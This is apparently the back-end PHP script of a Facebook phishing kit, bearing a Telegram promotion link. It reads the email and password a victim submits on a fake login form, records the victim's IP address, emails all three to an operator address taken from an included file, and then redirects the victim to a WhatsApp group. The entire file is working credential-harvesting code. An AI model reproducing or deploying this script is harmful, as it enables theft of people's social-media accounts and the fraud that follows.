<?php
$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];

$subject = "Result Facebook { $user }";
$message = '
<center> 
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3.5"><b>Result Facebook 18+</b></font>
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Email</th>
  <th style="width:78%;text-align: center;"><b>'.$user.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Password</th>
  <th style="width:78%;text-align: center;"><b>'.$pass.'</th> 
 </tr>
   <th style="width:22%;text-align:left;" height="25px"><b>IP</th>
  <th style="width:78%;text-align: center;"><b>'.$ip.'</th> 
 </tr>
 </table>
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<a href="https://t.me/scriptpremium">Temukan Saya </a>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .=  'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: Samlekom Mamank <admin@scprem.id>' . "\r\n";
$datamail = mail($email, $subject, $message, $headersx);
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/IiXF0d5qUBKGLd3A6MHYym">
</head>
<body>
</body>
</html>
